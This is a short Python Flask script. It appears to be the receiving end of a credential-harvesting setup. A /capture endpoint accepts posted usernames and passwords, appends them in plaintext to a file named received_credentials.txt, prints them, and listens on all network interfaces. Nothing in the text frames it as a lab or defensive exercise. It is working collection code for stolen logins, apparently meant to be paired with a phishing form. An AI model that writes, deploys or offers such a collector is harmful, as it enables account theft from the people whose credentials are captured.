from flask import Flask, request

app = Flask(__name__)

@app.route("/capture", methods=["POST"])
def capture_data():
    # Extract username and password from the request
    username = request.form.get("username")
    password = request.form.get("password")

    # Log the data to a file
    with open("received_credentials.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")

    print(f"Received credentials - Username: {username}, Password: {password}")

    return "Credentials received", 200

if __name__ == "__main__":
    # Run the Flask app on all network interfaces, port 5001
    app.run(host="0.0.0.0", port=5001)
